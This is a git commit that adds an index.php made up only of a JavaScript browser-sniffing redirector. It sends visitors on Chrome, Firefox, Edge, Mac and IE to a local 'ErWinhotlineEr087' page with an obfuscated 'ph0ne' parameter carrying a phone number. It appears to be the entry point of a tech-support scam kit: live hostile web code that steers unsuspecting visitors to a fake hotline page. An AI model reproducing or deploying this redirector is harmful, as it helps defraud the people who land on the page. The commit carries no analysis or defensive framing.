26cab3bf40536e21c671d1dc043f83f11e48c4be
venkatdigimark <130147383+venkatdigimark@users.noreply.github.com>
2023-12-06 18:58:37 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,35 @@
+<script type="text/javascript">
+var isChromium = window.chrome,
+	vendorName = window.navigator.vendor,
+	isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
+	isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
+
+if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
+	// is Google chrome
+window.location.href = "./ErWinhotlineEr087/index.html?ph0ne=05271-6934-909";
+}
+if(navigator.userAgent.indexOf("Firefox") != -1 )
+	{
+			 window.location.href = "./ErWinhotlineEr087/index.html?ph0ne=05271-6934-909";
+	}
+
+	if(window.navigator.userAgent.indexOf("dg") != -1 )
+		{
+				 window.location.href = "./ErWinhotlineEr087/index.html?ph0ne=05271-6934-909";
+		}
+
+if(window.navigator.userAgent.indexOf("Edge") != -1 )
+	{
+			 window.location.href = "./ErWinhotlineEr087/index.html?ph0ne=05271-6934-909";
+	}
+if(window.navigator.userAgent.indexOf("Mac") != -1 )
+	{
+			 window.location.href = "./ErWinhotlineEr087/index.html?ph0ne=05271-6934-909";
+	}
+if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
+	{
+		window.location.href = "./ErWinhotlineEr087/index.html?ph0ne=05271-6934-909";
+	}
+$SAFARI_URL = "apple";
+</script>
